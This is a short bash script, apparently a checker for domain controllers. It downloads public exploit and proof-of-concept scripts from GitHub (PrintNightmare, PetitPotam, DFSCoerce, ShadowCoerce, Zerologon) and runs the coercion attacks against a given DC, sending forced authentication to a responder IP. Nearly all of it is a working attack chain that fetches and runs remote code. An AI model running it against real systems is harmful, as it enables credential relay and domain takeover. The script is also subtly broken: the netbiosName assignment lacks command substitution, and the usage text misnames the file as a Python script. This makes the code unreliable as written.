#!/bin/bash
if [ $# -lt 2 ]
        then
                echo "Usage is: ./checker.py <responder-ip> <dc-ip>"
                exit 1
fi

if [ ! -f CVE-2021-34527.py ]
        then
                wget https://raw.githubusercontent.com/nemo-wq/PrintNightmare-CVE-2021-34527/master/CVE-2021-34527.py -q
                echo "[+] Downloaded Print Nightmare exploit CVE-2021-34527"
        else
                echo "[-] Print Nightmare exploit CVE-2021-34527 already present"
fi
if [ ! -f PetitPotam.py ]
        then
                wget https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py -q
                echo "[+] Downloaded PetitPotam checker"
        else
                echo "[-] Petit Potam checker already present"
fi
if [ ! -f dfscoerce.py ]
        then
                wget https://raw.githubusercontent.com/Wh04m1001/DFSCoerce/main/dfscoerce.py -q
                echo "[+] Downloaded DFSCoerce checker"
        else
                echo "[-] DFSCoerce checker already present"
fi
if [ ! -f shadowcoerce.py ]
        then
                wget https://raw.githubusercontent.com/ShutdownRepo/ShadowCoerce/main/shadowcoerce.py -q
                echo "[+] Downloaded Shadow Coerce checker"
        else
                echo "[-] Shadow Coerce checker already present"
fi
if [ ! -f zerologon_tester.py ]
        then
                wget https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py -q
                echo "[+] Downloaded Zero Logon checker"
        else
                echo "[-] Zero Logon checker already present"
fi

netbiosName=nbtscan $2 | awk '{ print $1 }' | grep "\."
python PetitPotam.py $1 $2
python dfscoerce.py $1 $2
python shadowcoerce.py $1 $2
python zerologon_tester.py $netbiosName $2
echo "[-] CVE-2021-34527 Print Nightmare must be tested manually (requires creds)"